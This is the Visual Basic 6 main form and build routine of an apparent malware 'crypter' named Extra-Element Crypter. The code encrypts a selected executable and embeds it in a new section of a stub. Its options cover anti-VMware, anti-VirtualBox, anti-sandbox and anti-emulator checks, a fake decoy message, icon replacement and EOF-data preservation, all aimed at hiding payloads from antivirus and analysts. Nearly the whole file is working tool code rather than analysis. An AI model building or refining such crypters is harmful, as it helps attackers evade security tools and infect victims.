VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Extra-Element Crypter"
   ClientHeight    =   7800
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   4200
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7800
   ScaleWidth      =   4200
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog dlgOpenIcon 
      Left            =   1800
      Top             =   8160
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog dlgSave 
      Left            =   1320
      Top             =   8160
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog dlgOpen 
      Left            =   2280
      Top             =   8160
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame sFrames 
      Caption         =   "File"
      Height          =   1335
      Index           =   0
      Left            =   0
      TabIndex        =   0
      Top             =   1200
      Width           =   4215
      Begin VB.TextBox txtFile 
         Enabled         =   0   'False
         Height          =   285
         Left            =   240
         TabIndex        =   7
         Text            =   "Select a file..."
         Top             =   360
         Width           =   3735
      End
      Begin prjEEC.lvButtons_H cmdBrowse 
         Height          =   375
         Left            =   2400
         TabIndex        =   6
         Top             =   840
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Browse"
         CapAlign        =   2
         BackStyle       =   7
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cFore           =   0
         cFHover         =   0
         cBhover         =   8421504
         Focus           =   0   'False
         LockHover       =   3
         cGradient       =   12632256
         Gradient        =   3
         Mode            =   0
         Value           =   0   'False
         cBack           =   16777215
      End
   End
   Begin VB.Frame sFrames 
      Caption         =   "Build"
      Height          =   1335
      Index           =   4
      Left            =   0
      TabIndex        =   4
      Top             =   6480
      Width           =   4215
      Begin VB.ListBox lstBuild 
         Height          =   1035
         ItemData        =   "frmMain.frx":628A
         Left            =   120
         List            =   "frmMain.frx":628C
         TabIndex        =   5
         Top             =   240
         Width           =   3015
      End
      Begin prjEEC.lvButtons_H cmdBuild 
         Height          =   975
         Left            =   3240
         TabIndex        =   8
         Top             =   240
         Width           =   855
         _ExtentX        =   1508
         _ExtentY        =   1720
         Caption         =   "Build"
         CapAlign        =   2
         BackStyle       =   7
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cFore           =   0
         cFHover         =   0
         cBhover         =   8421504
         Focus           =   0   'False
         LockHover       =   3
         cGradient       =   12632256
         Gradient        =   3
         Mode            =   0
         Value           =   0   'False
         cBack           =   16777215
      End
   End
   Begin VB.Frame sFrames 
      Caption         =   "Misc"
      Height          =   1335
      Index           =   3
      Left            =   0
      TabIndex        =   3
      Top             =   2520
      Width           =   4215
      Begin VB.TextBox txtMessage 
         Enabled         =   0   'False
         Height          =   525
         Left            =   960
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   13
         Text            =   "frmMain.frx":628E
         Top             =   720
         Width           =   3015
      End
      Begin VB.TextBox txtTitle 
         Enabled         =   0   'False
         Height          =   285
         Left            =   960
         TabIndex        =   11
         Text            =   "Title..."
         Top             =   480
         Width           =   3015
      End
      Begin VB.CheckBox chkFakeMessage 
         Caption         =   "Fake Message"
         Height          =   255
         Left            =   240
         TabIndex        =   9
         Top             =   240
         Width           =   1455
      End
      Begin VB.Label lbl 
         BackStyle       =   0  'Transparent
         Caption         =   "Message:"
         Enabled         =   0   'False
         Height          =   255
         Index           =   1
         Left            =   240
         TabIndex        =   12
         Top             =   720
         Width           =   735
      End
      Begin VB.Label lbl 
         BackStyle       =   0  'Transparent
         Caption         =   "Title:"
         Enabled         =   0   'False
         Height          =   255
         Index           =   0
         Left            =   240
         TabIndex        =   10
         Top             =   480
         Width           =   495
      End
   End
   Begin VB.Frame sFrames 
      Caption         =   "Options"
      Height          =   1335
      Index           =   2
      Left            =   0
      TabIndex        =   2
      Top             =   3840
      Width           =   4215
      Begin VB.TextBox txtKey 
         Enabled         =   0   'False
         Height          =   285
         Left            =   2040
         TabIndex        =   24
         Top             =   600
         Width           =   1455
      End
      Begin VB.TextBox txtIcon 
         Enabled         =   0   'False
         Height          =   285
         Left            =   240
         TabIndex        =   17
         Text            =   "Select an icon..."
         Top             =   960
         Width           =   3255
      End
      Begin VB.CheckBox chkChangeIcon 
         Caption         =   "Change Icon"
         Height          =   255
         Left            =   240
         TabIndex        =   16
         Top             =   600
         Width           =   1215
      End
      Begin VB.CheckBox chkRealignPEHeader 
         Caption         =   "Realign PE Header"
         Height          =   255
         Left            =   2160
         TabIndex        =   15
         Top             =   240
         Width           =   1695
      End
      Begin VB.CheckBox chkPreserveEOFData 
         Caption         =   "Preserve EOF Data"
         Height          =   255
         Left            =   240
         TabIndex        =   14
         Top             =   240
         Width           =   1695
      End
      Begin prjEEC.lvButtons_H cmdBrowseIcon 
         Height          =   300
         Left            =   3600
         TabIndex        =   18
         Top             =   960
         Width           =   375
         _ExtentX        =   661
         _ExtentY        =   529
         Caption         =   "..."
         CapAlign        =   2
         BackStyle       =   7
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cFore           =   0
         cFHover         =   0
         cBhover         =   8421504
         Focus           =   0   'False
         LockHover       =   3
         cGradient       =   12632256
         Gradient        =   3
         Mode            =   0
         Value           =   0   'False
         Enabled         =   0   'False
         cBack           =   16777215
      End
      Begin prjEEC.lvButtons_H cmdGenKey 
         Height          =   300
         Left            =   3600
         TabIndex        =   25
         Top             =   600
         Width           =   375
         _ExtentX        =   661
         _ExtentY        =   529
         Caption         =   "..."
         CapAlign        =   2
         BackStyle       =   7
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cFore           =   0
         cFHover         =   0
         cBhover         =   8421504
         Focus           =   0   'False
         LockHover       =   3
         cGradient       =   12632256
         Gradient        =   3
         Mode            =   0
         Value           =   0   'False
         cBack           =   16777215
      End
      Begin VB.Label lbl 
         BackStyle       =   0  'Transparent
         Caption         =   "Key:"
         Enabled         =   0   'False
         Height          =   255
         Index           =   2
         Left            =   1680
         TabIndex        =   23
         Top             =   600
         Width           =   495
      End
   End
   Begin VB.Frame sFrames 
      Caption         =   "Anti's"
      Height          =   1335
      Index           =   1
      Left            =   0
      TabIndex        =   1
      Top             =   5160
      Width           =   4215
      Begin VB.CheckBox chkAntiVirtualBox 
         Caption         =   "Anti - Virtual Box"
         Height          =   255
         Left            =   2160
         TabIndex        =   22
         Top             =   840
         Width           =   1695
      End
      Begin VB.CheckBox chkAntiSandboxes 
         Caption         =   "Anti - Sandboxes"
         Height          =   255
         Left            =   2160
         TabIndex        =   21
         Top             =   360
         Width           =   1695
      End
      Begin VB.CheckBox chkAntiEmulators 
         Caption         =   "Anti - Emulators"
         Height          =   255
         Left            =   240
         TabIndex        =   20
         Top             =   840
         Width           =   1695
      End
      Begin VB.CheckBox chkAntiVMWare 
         Caption         =   "Anti - VMWare"
         Height          =   255
         Left            =   240
         TabIndex        =   19
         Top             =   360
         Width           =   1695
      End
   End
   Begin VB.Image Image1 
      Height          =   1215
      Left            =   0
      Picture         =   "frmMain.frx":629B
      Top             =   0
      Width           =   4200
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Const sSplit = "!@#@!"
Const sSectionName = "Test"

Private Sub chkChangeIcon_Click()
    cmdBrowseIcon.Enabled = chkChangeIcon.Value
End Sub

Private Sub chkFakeMessage_Click()
    lbl(0).Enabled = chkFakeMessage.Value
    lbl(1).Enabled = chkFakeMessage.Value
    txtTitle.Enabled = chkFakeMessage.Value
    txtMessage.Enabled = chkFakeMessage.Value
End Sub

Private Sub cmdBrowse_Click()
    With dlgOpen
        .DialogTitle = "Open"
        .Filter = "Executables (*.exe)|*.exe"
        .ShowOpen
    End With
    
    txtFile.Text = dlgOpen.FileName
End Sub

Private Sub cmdBrowseIcon_Click()
    With dlgOpenIcon
        .DialogTitle = "Open"
        .Filter = "Icons (*.ico)|*.ico"
        .ShowOpen
    End With
    
    txtIcon.Text = dlgOpenIcon.FileName
End Sub

Private Sub cmdBuild_Click()
    If txtFile.Text <> "Select a file..." And txtFile.Text <> "" Then
        With dlgSave
            .DialogTitle = "Save"
            .Filter = "Executables (*.exe)|*.exe"
            .ShowSave
        End With
        
        Call AddInfo("Building started...")
        Call BuildFile
    Else
        Call AddInfo("Error...")
        MsgBox "Select a valid file!", vbCritical, "Error"
    End If
End Sub

Private Sub cmdGenKey_Click()
    txtKey.Text = GenKey(12)
End Sub

Private Sub BuildFile()
    Dim sFile           As String
    Dim sEOF            As String
    Dim sSettings       As String
    Dim bStub()         As Byte
    Dim dwSettings      As Long
    Dim dwRaw           As Long
    
    Call AddInfo("Reading file to string...")
    
    Open txtFile.Text For Binary As #1
        sFile = Space(LOF(1))
        Get #1, , sFile
    Close #1
    
    Call AddInfo("File read to string...")
    
    If chkPreserveEOFData.Value = vbChecked Then
        Call AddInfo("Reading eof data...")
        sEOF = GetEOFData(txtFile.Text)
    End If
    
    Call AddInfo("Loading stub...")
    
    bStub = LoadResData(101, "CUSTOM")
    
    Call AddInfo("Encrypting file...")
    sFile = EncryptData(sFile, txtKey.Text)
    Call AddInfo("File encrypted...")
    
    
    sSettings = sSplit & chkAntiVMWare.Value & sSplit & chkAntiEmulators.Value & sSplit & chkAntiSandboxes.Value & sSplit _
    & chkAntiVirtualBox.Value & sSplit & txtKey.Text & sSplit & chkFakeMessage.Value & sSplit & txtTitle.Text & sSplit & txtMessage.Text & sSplit
    sSettings = sSplit & sFile & sSettings
    
    Call AddInfo("Opening saved file...")
    Open dlgSave.FileName For Binary As #1
        Call AddInfo("Writing stub to file...")
        Put #1, , bStub()
    Close #1
    Call AddInfo("Closing file...")
    
    Call AddInfo("Adding new section...")
    
    If AddTheData(sSettings, sSectionName) Then
        If chkChangeIcon.Value = vbChecked Then
            If txtIcon.Text <> "Select an icon..." And txtIcon.Text <> "" Then
                If ChangeIcon(dlgSave.FileName, txtIcon.Text) Then
                    Call AddInfo("Icon changed...")
                Else
                    Call AddInfo("Icon changing failed...")
                End If
            End If
        End If
            
        If chkPreserveEOFData.Value = vbChecked Then
            Call AddInfo("Adding EOF data...")
            
            Call WriteEOFData(dlgSave.FileName, sEOF)
        End If
        
        If chkRealignPEHeader.Value = vbChecked Then
            mPE_Realign.RealignPEFromFile dlgSave.FileName
        End If
            
        Call AddInfo("Finished...")
        MsgBox "File Crypting Finished.", vbInformation, "Success!"
    Else
        MsgBox "Error Adding New Section.", vbCritical, "Error"
    End If
End Sub

Private Sub AddInfo(sInfo As String)
    lstBuild.AddItem "[" & Time & "] " & sInfo
End Sub

Private Sub Form_Load()
    txtKey.Text = GenKey(12)
End Sub

